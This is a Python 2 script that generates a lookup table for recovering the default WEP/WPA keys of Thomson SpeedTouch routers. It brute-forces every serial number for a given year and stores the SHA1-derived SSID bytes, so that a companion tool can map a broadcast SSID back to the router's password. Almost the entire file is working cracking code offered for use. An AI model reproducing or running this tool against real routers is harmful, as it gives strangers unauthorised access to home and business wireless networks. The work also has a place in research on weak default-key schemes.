#!/usr/bin/python
############################################
# touchspeed_createtable.py v0.2 2009/10/9 #
############################################
# Lookup table generator for Thomson SpeedTouch router WEP/WPA keys, for use with TouchSpeedCalc.
#
# For every router serial number, it stores only the last 3 bytes of the hexified-sha1-hash (the SSID-part).
# You can search the resulting dat file for these 3 bytes, make sure that ( position % 3 = 0 ).
#
# (position / 3) can be calculated back to the serial number using TouchSpeedCalc, 
# which in turn requires just one call to the sha1-function to retreive the WEP/WPA password.
#
# 	http://www.mentalpitstop.com/touchspeedcalc
#
# Licenses under the Creative Commons Attribution-Noncommercial-Share Alike 3.0 license.
# http://creativecommons.org/licenses/by-nc-sa/3.0/us/
# Contact me at mentalpitstop.com for more info.
#
# Requires Python >=2.5 for hashlib
# edit the variable 'year_list' to generate a list with WEP/WPA keys for a different year
# edit the variable 'FILENAME' to specify where to store the file
#
####################################
# Built upon work of other people: #
####################################
# Python version of stkeys.c by Kevin Devine (see http://weiss.u40.hosting.digiweb.ie/stech/)
# stkeys.c by Hubert Seiwert, hubert.seiwert@nccgroup.com 2008-04-17
####################################

import sys
import hashlib
import binascii
import os

# Create database for this year: "
year_list = [2011]
FILENAME = "touchspeedcalc_2011.dat"


try: 
	os.remove(FILENAME)
except:
	pass

L = list()
ssid_end_length = 6
offset = ( 40 - ssid_end_length ) /2
charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

def ascii2hex(char):
        return hex(ord(char))[2:].upper()

for year in [y-2000 for y in year_list]:
        for week in range(1,53): #1..52
                #print 'Trying year 200%d week %d' % (year,week)
                for char1 in charset:
                        for char2 in charset:
                                for char3 in charset:
                                        SN = 'CP%02d%02d%s%s%s' % (year,week,ascii2hex(char1),ascii2hex(char2),ascii2hex(char3))
					#make sure SN is all uppercase!
                                        hash = hashlib.sha1(SN).digest()
                                        print "SN:",str(SN),"  ","hash:",str(binascii.hexlify(hash))
					ssid = hash[17:]
					password = hash[0:5]
					ssid_password = hash[17:]
					ssid_password += hash[0:5]
					#password = hash[0:10].upper()
					L.append(ssid)
					print "\n",binascii.hexlify(ssid),"\n"

# Create file and write it to disk:
FILE = open(FILENAME,"w")
for ITEM in L:
	FILE.write(ITEM)
FILE.close()
